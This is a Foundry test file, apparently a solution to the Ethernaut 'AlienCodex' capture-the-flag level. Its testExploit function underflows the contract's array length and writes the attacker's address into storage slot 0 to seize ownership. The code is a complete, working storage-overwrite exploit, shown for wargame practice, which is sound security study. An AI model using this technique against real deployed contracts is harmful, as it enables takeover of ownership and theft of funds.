// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IAlienCodex {
    // Añadimos el 'returns (address)' para poder verificarlo luego
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external; 
}

contract AlienCodexTest is Test {
    address public hacker = address(0x1337);
    IAlienCodex alienCodex;

    function setUp() public {
        address deployedAddress = deployCode("19_AlienCodex.sol:AlienCodex");
        alienCodex = IAlienCodex(deployedAddress);
        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
    
        alienCodex.makeContact();
    
        alienCodex.retract();
        
        uint256 iSlot0;
        unchecked {
            iSlot0 = 0 - uint256(keccak256(abi.encode(1)));
        }
        
        bytes32 fAddress = bytes32(uint256(uint160(hacker)));
        
        alienCodex.revise(iSlot0, fAddress);
        
        vm.stopPrank();

        assertEq(alienCodex.owner(), hacker);
    }
}